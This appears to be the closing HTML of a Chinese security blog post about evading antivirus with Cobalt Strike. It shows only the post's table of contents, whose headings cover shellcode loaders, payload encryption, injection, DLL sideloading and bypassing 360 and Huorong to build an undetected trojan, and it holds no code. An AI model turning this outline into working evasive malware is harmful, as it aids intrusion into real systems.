        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E4%B8%8E%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Shellcode与加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode%E5%9F%BA%E7%A1%80"><span class="toc-text">Shellcode基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshellcode"><span class="toc-text">什么是shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E6%96%87%E4%BB%B6"><span class="toc-text">shellcode文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C"><span class="toc-text">shellcode如何运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CS%E7%9A%84shellcode%E7%94%9F%E6%88%90"><span class="toc-text">CS的shellcode生成</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Shellcode加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">什么是shellcode加载器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">如何编写shellcode加载器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VirtualAlloc%E5%87%BD%E6%95%B0"><span class="toc-text">VirtualAlloc函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#memcpy%E5%87%BD%E6%95%B0"><span class="toc-text">memcpy函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CreateThread"><span class="toc-text">CreateThread</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">C语言加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-text">完整代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Visual-Studio%E9%85%8D%E7%BD%AE"><span class="toc-text">Visual Studio配置</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E8%AF%AD%E8%A8%80%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Python语言加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81-1"><span class="toc-text">完整代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E6%89%93%E5%8C%85exe"><span class="toc-text">python打包exe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E5%85%8D%E6%9D%80"><span class="toc-text">Shellcode免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-text">免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-text">免杀的方法有哪些</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF"><span class="toc-text">杀软</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99"><span class="toc-text">常用网站</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80"><span class="toc-text">静态查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">代码中的函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#shellcode%E7%89%B9%E5%BE%81"><span class="toc-text">shellcode特征</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8Cmd5"><span class="toc-text">文件名和md5</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-text">加密</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D"><span class="toc-text">数字签名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6"><span class="toc-text">资源文件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80"><span class="toc-text">动态查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3"><span class="toc-text">网络相关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3"><span class="toc-text">内存相关</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#360%E4%BA%91%E4%BC%A0"><span class="toc-text">360云传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode%E5%A4%84%E7%90%86"><span class="toc-text">Shellcode处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-text">shellcode加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86"><span class="toc-text">异或加密</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#AES%E5%8A%A0%E5%AF%86"><span class="toc-text">AES加密</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%86%85%E5%AD%98%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-text">shellcode内存加解密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%88%86%E7%A6%BB"><span class="toc-text">shellcode分离</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%86%E7%A6%BB"><span class="toc-text">本地分离</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%88%86%E7%A6%BB"><span class="toc-text">网络分离</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%A4%84%E7%90%86"><span class="toc-text">Shellcode加载器处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E8%BF%90%E8%A1%8C"><span class="toc-text">指针运行</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#void-addr"><span class="toc-text">((void(*)())addr)()</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E5%B1%9E%E6%80%A7"><span class="toc-text">修改内存属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9data%E6%AE%B5%E5%B1%9E%E6%80%A7"><span class="toc-text">修改data段属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE%E6%AE%B5"><span class="toc-text">新增数据段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A0%86%E5%8A%A0%E8%BD%BD"><span class="toc-text">堆加载</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#APC%E6%B3%A8%E5%85%A5%E8%BF%90%E8%A1%8C"><span class="toc-text">APC注入运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C"><span class="toc-text">回调函数运行</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#EnumDateFormatsA"><span class="toc-text">EnumDateFormatsA</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#EnumUILanguages"><span class="toc-text">EnumUILanguages</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%BA%A4%E7%A8%8B%E8%BF%90%E8%A1%8C"><span class="toc-text">创建纤程运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A8%E6%80%81api%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BD"><span class="toc-text">动态api函数加载</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%99%A8%E4%B8%8EPE%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-text">编译器与PE文件处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MD%E5%92%8CMT%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">MD和MT的区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%99%A8"><span class="toc-text">编译器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A0%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D"><span class="toc-text">加数字签名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B5%84%E6%BA%90%E4%BF%A1%E6%81%AF"><span class="toc-text">添加资源信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3"><span class="toc-text">加壳</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#upx%E5%8A%A0%E5%A3%B3"><span class="toc-text">upx加壳</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Shielden%E5%8A%A0%E5%A3%B3"><span class="toc-text">Shielden加壳</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#vmp%E5%8A%A0%E5%A3%B3"><span class="toc-text">vmp加壳</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%86%B5%E5%80%BC"><span class="toc-text">检查PE文件的熵值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%8A%A0%E9%BB%91"><span class="toc-text">白加黑</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E5%8A%A0%E9%BB%91%E6%A6%82%E5%BF%B5"><span class="toc-text">白加黑概念</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDLL%E6%96%87%E4%BB%B6"><span class="toc-text">什么是DLL文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E5%8E%9F%E7%90%86"><span class="toc-text">上线原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#DLL%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">DLL文件结构</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AADLL"><span class="toc-text">编译一个DLL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BDLL%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0"><span class="toc-text">查看DLL导出函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#DLL%E8%B0%83%E8%AF%95"><span class="toc-text">DLL调试</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E5%8A%A0%E9%BB%91%E5%88%B6%E4%BD%9C%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">白加黑制作上线CS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SkyShadow%E5%B7%A5%E5%85%B7"><span class="toc-text">SkyShadow工具</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%91DLL%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">制作黑DLL上线CS</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-text">实战利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81%E4%B8%8EDLL%E4%BB%A3%E7%90%86"><span class="toc-text">DLL劫持与DLL代理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80"><span class="toc-text">Go语言免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Go%E8%B0%83%E7%94%A8Windows-api"><span class="toc-text">Go调用Windows api</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#uinptr"><span class="toc-text">uinptr</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%94%E5%9B%9E3%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="toc-text">为什么返回3个参数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Go%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Go编写shellcode加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Go%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91"><span class="toc-text">Go语言编译</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-text">创建线程执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C-1"><span class="toc-text">回调函数运行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%86%E7%A6%BB-1"><span class="toc-text">本地分离</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E9%BB%91%E7%AA%97%E5%8F%A3"><span class="toc-text">关闭黑窗口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#360%E5%85%8D%E6%9D%80%E7%BB%95%E8%BF%87"><span class="toc-text">360免杀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exe%E5%B1%82%E9%9D%A2%E5%85%8D%E6%9D%80"><span class="toc-text">.exe层面免杀</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%85%8D%E6%9D%80"><span class="toc-text">代码层面免杀</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C360%E5%85%8D%E6%9D%80%E9%A9%AC"><span class="toc-text">制作360免杀马</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%81%AB%E7%BB%92%E5%85%8D%E6%9D%80%E7%BB%95%E8%BF%87"><span class="toc-text">火绒免杀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#sss%E7%81%AB%E7%BB%92%E6%9F%A5%E6%9D%80%E7%82%B9"><span class="toc-text">sss火绒查杀点</span></a></li></ol></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
    <div class="footer-views">
      
      
          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        
      
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        


        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CobaltStrike%E5%85%8D%E6%9D%80%E5%AE%9E%E8%B7%B5%E6%B1%87%E6%80%BB + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2025%2F05%2F30%2F12%25E5%25A4%25A9-%25E4%25BB%258E0%25E5%25BC%2580%25E5%25A7%258B%25E7%259A%2584%25E5%2585%258D%25E6%259D%2580%25E5%25AD%25A6%25E4%25B9%25A0%25E6%25B1%2587%25E6%2580%25BB%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2025/05/30/12%E5%A4%A9-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
